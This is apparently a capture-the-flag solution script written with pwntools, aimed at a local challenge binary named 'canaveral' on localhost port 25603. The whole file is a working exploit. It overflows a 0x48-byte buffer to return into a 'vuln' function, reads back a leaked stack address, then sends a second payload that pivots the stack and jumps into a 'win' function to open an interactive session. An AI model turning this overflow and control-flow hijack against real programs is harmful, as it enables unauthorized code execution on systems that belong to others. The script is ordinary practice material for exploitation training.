from pwn import *

exe = ELF('.build/canaveral')
context.binary = exe

#p = process('.build/canaveral')
p = remote('localhost', 25603)
#p = gdb.debug('.build/canaveral', gdbscript="b *0x000000000040129f")

p.recvuntil(b':')

payload = b'A' * 0x48 + p64(exe.sym['vuln'])

p.sendline(payload)

p.recvuntil(b'prize: ')

leak = int(p.recvline().strip(), 16)

info(f"[+] Buf @ {hex(leak)}")

p.recvuntil(b':')

payload2 = p64(0x402008) + b'A' * 0x4 + p64(0x31337)
payload2 += b'A' * (0x48 - len(payload2) - 0x8)  + p64(leak + 0x18) + p64(0x000000000040101a) + p64(exe.sym['win'] + 0x13) 

p.sendline(payload2)

p.recvline()

p.interactive()
